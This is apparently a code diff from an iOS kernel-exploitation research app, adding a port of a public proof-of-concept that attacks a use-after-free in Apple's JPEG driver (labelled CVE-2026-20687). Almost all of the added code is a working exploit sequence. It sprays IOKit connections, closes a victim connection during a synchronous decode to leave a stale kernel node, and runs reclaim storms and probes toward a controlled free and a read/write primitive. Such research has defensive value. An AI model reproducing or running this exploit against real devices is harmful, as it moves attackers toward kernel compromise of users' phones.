@@ -436,6 +436,290 @@ NSString *ModJpegUAF(void) {
 }
 
 // ===========================================================================
+// 4b. CVE-2026-20687 - the hidgate-poc "jpegclose7" control ladder, ported
+//     Source: github.com/hidra0x/hidgate-poc experiments/applejpeg/jpegclose7.m
+//     + docs/kernel-control.md.  Their measured ladder on A12 / iOS 18.7.2:
+//       L0 crash PASS, L1 deferred JpegRequest UAF PASS,
+//       L2 CONTROLLED 10s free PASS (sync decode returns kIOReturnTimeout
+//         0xe00002d6 after 10.001s - the driver's 10s wait expiring),
+//       L3 same-type reclaim PASS (10 async on the same connection right
+//         after the timeout reuse the just-freed slot),
+//       L4 persistent stale node PASS (far=0x308, reproduced WITHOUT Camera
+//         by closing the userclient while a sync decode is in flight),
+//       L5 write/read primitive NOT YET (their paired reclaim still misses
+//         the slot: x12=0).
+//     We port the exact sequence so the same levels can be measured on OUR
+//     A14 / 26.2b1 (23C5027f).  kIOReturnTimeout = 0xe00002d6.
+//     Sequence: prime -> mass spray (stalls the codec) -> early reclaim storm
+//     (connections kept OPEN, codecID = t&3) -> victim: sync decode + close
+//     DURING the sync -> second reclaim storm -> probe cycles -> free one
+//     reclaimer at a time and probe after each.
+// ===========================================================================
+#define RS_JC_MAXRECLAIM 32
+static io_connect_t rs_jc_reclaim[RS_JC_MAXRECLAIM];
+static volatile int32_t rs_jc_rcount = 0;
+
+// one decode submission; setCodec!=0 also writes request+0x48 (the codec id)
+static int rs_jc_submit(io_connect_t conn, uint32_t srcID, uint32_t dstID,
+                        uint32_t w, uint32_t h, int count, uint64_t tokenBase,
+                        uint8_t flags, uint32_t codecID, int setCodec) {
+    int submitted = 0;
+    for (int j = 0; j < count; j++) {
+        RSJpegIn in;
+        RSJpegIn out;
+        memset(&in, 0, sizeof in);
+        memset(&out, 0, sizeof out);
+        in.sourceID = srcID;
+        in.destID = dstID;
+        in.field_04 = w * h;
+        in.field_0C = w * h * 4;
+        in.width = w;
+        in.height = h;
+        in.outWidth = w;
+        in.outHeight = h;
+        in.subsampling = 3;
+        in.flags = flags;
+        in.asyncToken = tokenBase + (uint64_t)j;
+        if (setCodec) in.codecID = codecID;
+        size_t outSz = sizeof out;
+        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in, &out, &outSz);
+        if (kr != KERN_SUCCESS) break;
+        submitted++;
+    }
+    return submitted;
+}
+
+// one SYNCHRONOUS decode (asyncToken = 0, flags = 0) - the only call shape
+// that can reach the driver's 10s wait and return kIOReturnTimeout
+static kern_return_t rs_jc_sync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
+                                uint32_t w, uint32_t h, CFTimeInterval *dt) {
+    RSJpegIn in;
+    RSJpegIn out;
+    memset(&in, 0, sizeof in);
+    memset(&out, 0, sizeof out);
+    in.sourceID = srcID;
+    in.destID = dstID;
+    in.field_04 = w * h;
+    in.field_0C = w * h * 4;
+    in.width = w;
+    in.height = h;
+    in.outWidth = w;
+    in.outHeight = h;
+    in.subsampling = 3;
+    in.flags = 0;
+    in.asyncToken = 0;
+    size_t outSz = sizeof out;
+    CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
+    kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in, &out, &outSz);
+    if (dt) *dt = CFAbsoluteTimeGetCurrent() - t0;
+    return kr;
+}
+
+NSString *ModJpegClose(void) {
+    AveLog(@"[jpegclose] === CVE-2026-20687 ladder (hidgate-poc jpegclose7 port): prime -> mass spray -> early reclaim -> victim sync+close -> reclaim storm -> probe ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    // 2048x2048 (their size: big enough that the codec actually queues work)
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    [[UIColor blueColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W / 2, H / 2));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }
+
+    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOObjectRelease(svc);
+        return @"surface creation failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+    AveLog(S(@"[jpegclose] src=%u dst=%u jpeg=%zuB %ux%u", srcID, dstID, jpeg.length, W, H));
+
+    memset(rs_jc_reclaim, 0, sizeof rs_jc_reclaim);
+    rs_jc_rcount = 0;
+
+    // ---- Phase 1: small prime (leaks the client state) ----
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    AveLog(S(@"[jpegclose] prime open kr=%#x", kr));
+    if (kr == KERN_SUCCESS && conn) {
+        int n = rs_jc_submit(conn, srcID, dstID, W, H, 5, 0x11110000, 0, 0, 0);
+        AveLog(S(@"[jpegclose] prime submitted=%d", n));
+        IOServiceClose(conn);
+    }
+    usleep(300000);
+
+    // ---- Phase 2: mass spray - stalls the codec so the next sync decode
+    //      actually reaches its 10s wait ----
+    const int STHREADS = 8, SITERS = 100, SREQS = 10;
+    __block int32_t sConn = 0, sReq = 0, sFail = 0;
+    AveLog(S(@"[jpegclose] mass spray start %dx%dx%d", STHREADS, SITERS, SREQS));
+    dispatch_group_t sgroup = dispatch_group_create();
+    for (int t = 0; t < STHREADS; t++) {
+        dispatch_group_async(sgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < SITERS; i++) {
+                io_connect_t mc = 0;
+                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &mc);
+                if (opr != KERN_SUCCESS || !mc) { __sync_fetch_and_add(&sFail, 1); continue; }
+                int n = rs_jc_submit(mc, srcID, dstID, W, H, SREQS,
+                                     0x31310000 + (t << 8) + i, 0, 0, 0);
+                if (n < SREQS) __sync_fetch_and_add(&sFail, 1);
+                IOServiceClose(mc);
+                __sync_fetch_and_add(&sReq, n);
+                __sync_fetch_and_add(&sConn, 1);
+            }
+        });
+    }
+    dispatch_group_wait(sgroup, dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));
+    AveLog(S(@"[jpegclose] mass spray done conn=%d req=%d fail=%d", sConn, sReq, sFail));
+    usleep(1000000);
+
+    // ---- Phase 3: early reclaim storm - connections stay OPEN, requests in
+    //      flight, one codec each (codecID = t & 3) ----
+    const int ETHREADS = 8, EREQS = 5;
+    AveLog(S(@"[jpegclose] early reclaim start threads=%d reqs=%d", ETHREADS, EREQS));
+    dispatch_group_t eg = dispatch_group_create();
+    for (int t = 0; t < ETHREADS; t++) {
+        dispatch_group_async(eg, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            io_connect_t c = 0;
+            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
+            if (opr != KERN_SUCCESS || !c) {
+                AveLog(S(@"[jpegclose] early reclaim[%d] open kr=%#x", t, opr));
+                return;
+            }
+            int n = rs_jc_submit(c, srcID, dstID, W, H, EREQS,
+                                 0x51510000 + (t << 8), 0, (uint32_t)(t & 3), 1);
+            int idx = __sync_fetch_and_add(&rs_jc_rcount, 1);
+            if (idx < RS_JC_MAXRECLAIM) rs_jc_reclaim[idx] = c;
+            AveLog(S(@"[jpegclose] early reclaim[%d] submitted=%d", t, n));
+        });
+    }
+    dispatch_group_wait(eg, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
+    AveLog(S(@"[jpegclose] early reclaim done conns=%d", rs_jc_rcount));
+    usleep(100000);
+
+    // ---- Phase 4: THE TRIGGER - sync decode on a victim connection, and
+    //      close that connection while the sync is still in flight.
+    //      terminatePhase1 marks the client inactive early, so the timeout
+    //      free skips the dequeue and leaves the embedded queue node in the
+    //      per-codec vector: a persistent stale node, NO Camera needed. ----
+    io_connect_t victim = 0;
+    kern_return_t vor = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    AveLog(S(@"[jpegclose] victim open kr=%#x", vor));
+    if (vor == KERN_SUCCESS && victim) {
+        __block kern_return_t syncKr = 0xdead;
+        __block CFTimeInterval syncDt = 0;
+        dispatch_group_t vgroup = dispatch_group_create();
+        dispatch_group_async(vgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            CFTimeInterval dt = 0;
+            syncKr = rs_jc_sync(victim, srcID, dstID, W, H, &dt);
+            syncDt = dt;
+            AveLog(S(@"[jpegclose] victim sync kr=%#x dt=%.3fs", syncKr, syncDt));
+        });
+        usleep(100000);   // the sync is now in flight
+        dispatch_group_async(vgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            kern_return_t cr = IOServiceClose(victim);
+            AveLog(S(@"[jpegclose] victim close DURING sync kr=%#x", cr));
+        });
+        dispatch_group_wait(vgroup, dispatch_time(DISPATCH_TIME_NOW, 20 * NSEC_PER_SEC));
+        AveLog(S(@"[jpegclose] close-during-sync done kr=%#x dt=%.3fs", syncKr, syncDt));
+        if (syncKr == (kern_return_t)0xe00002d6)
+            AveLog(@"[jpegclose] *** CONTROLLED 10s FREE CONFIRMED (kIOReturnTimeout) ***");
+        else
+            AveLog(@"[jpegclose] no timeout return: the sync did not reach the 10s wait");
+    }
+
+    // ---- Phase 5: second reclaim storm (appends to the open connections) ----
+    const int RTHREADS = 8, RREQS = 5;
+    AveLog(S(@"[jpegclose] reclaim storm start threads=%d reqs=%d", RTHREADS, RREQS));
+    dispatch_group_t rg = dispatch_group_create();
+    for (int t = 0; t < RTHREADS; t++) {
+        dispatch_group_async(rg, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            io_connect_t c = 0;
+            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
+            if (opr != KERN_SUCCESS || !c) {
+                AveLog(S(@"[jpegclose] reclaim[%d] open kr=%#x", t, opr));
+                return;
+            }
+            int n = rs_jc_submit(c, srcID, dstID, W, H, RREQS,
+                                 0x71710000 + (t << 8), 0, (uint32_t)(t & 3), 1);
+            int idx = __sync_fetch_and_add(&rs_jc_rcount, 1);
+            if (idx < RS_JC_MAXRECLAIM) rs_jc_reclaim[idx] = c;
+            AveLog(S(@"[jpegclose] reclaim[%d] submitted=%d", t, n));
+        });
+    }
+    dispatch_group_wait(rg, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
+    AveLog(S(@"[jpegclose] reclaim storm done conns=%d", rs_jc_rcount));
+    usleep(50000);
+
+    // ---- Phase 6: probe while the reclaim requests are still in flight ----
+    for (int round = 0; round < 3; round++) {
+        io_connect_t probe = 0;
+        kern_return_t por = IOServiceOpen(svc, mach_task_self(), 0, &probe);
+        if (por != KERN_SUCCESS || !probe) { usleep(200000); continue; }
+        CFTimeInterval dt = 0;
+        kern_return_t pr = rs_jc_sync(probe, srcID, dstID, W, H, &dt);
+        AveLog(S(@"[jpegclose] probe round=%d kr=%#x dt=%.3fs", round, pr, dt));
+        IOServiceClose(probe);
+        usleep(200000);
+    }
+
+    // ---- Phase 7: free ONE reclaimer at a time and probe after each.  If the
+    //      stale node points into that connection's request, the next queue
+    //      walk is a UAF on a slot WE chose. ----
+    for (int i = 0; i < rs_jc_rcount && i < RS_JC_MAXRECLAIM; i++) {
+        if (!rs_jc_reclaim[i]) continue;
+        AveLog(S(@"[jpegclose] freeing reclaim[%d]", i));
+        IOServiceClose(rs_jc_reclaim[i]);
+        rs_jc_reclaim[i] = 0;
+        usleep(100000);
+        io_connect_t probe = 0;
+        kern_return_t por = IOServiceOpen(svc, mach_task_self(), 0, &probe);
+        if (por != KERN_SUCCESS || !probe) continue;
+        CFTimeInterval dt = 0;
+        kern_return_t pr = rs_jc_sync(probe, srcID, dstID, W, H, &dt);
+        AveLog(S(@"[jpegclose] probe-after-free[%d] kr=%#x dt=%.3fs", i, pr, dt));
+        IOServiceClose(probe);
+        usleep(100000);
+    }
+
+    // ---- Phase 8: keep whatever is left alive while Camera is foregrounded
+    //      (the driver's deferred completion path is the other trigger) ----
+    UIBackgroundTaskIdentifier bg = [[UIApplication sharedApplication]
+        beginBackgroundTaskWithName:@"jpegclose" expirationHandler:^{
+            AveLog(@"[jpegclose] background task expired");
+        }];
+    AveLog(@"[jpegclose] phases done - OPEN CAMERA NOW and wait 15s (the other deferred path)");
+    sleep(40);
+    if (bg != UIBackgroundTaskInvalid)
+        [[UIApplication sharedApplication] endBackgroundTask:bg];
+
+    for (int i = 0; i < rs_jc_rcount && i < RS_JC_MAXRECLAIM; i++) {
+        if (rs_jc_reclaim[i]) { IOServiceClose(rs_jc_reclaim[i]); rs_jc_reclaim[i] = 0; }
+    }
+    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
+    AveSetStatus(@"jpegclose ladder done - see the log");
+    return S(@"jpegclose: mass=%d/%d, reclaim conns=%d; look for kr=0xe00002d6 (controlled free) and a far=0x308 panic",
+              sReq, sConn, rs_jc_rcount);
+}
+
+// ===========================================================================
 // 1. CVE-2026-64788 oracle
 // ===========================================================================
 NSString *ModIOGPUUAFOracle(void) {
